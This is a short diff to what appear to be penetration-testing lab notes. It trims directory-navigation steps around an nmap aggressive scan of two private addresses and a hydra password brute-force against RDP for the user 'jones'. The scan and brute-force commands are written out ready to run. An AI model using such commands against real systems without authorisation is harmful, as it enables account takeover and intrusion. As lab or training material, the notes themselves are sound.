@@ -13,8 +13,6 @@ nmap -A 10.19.41.25 10.19.41.28
 
 Now we have to find the Wordlist location (home --> parrot --> Desktop)
 cd ..
-cd ..
-cd home
 cd parrot
 cd Desktop
 hydra -l jones -P Wordlist.txt rdp://10.19.41.25
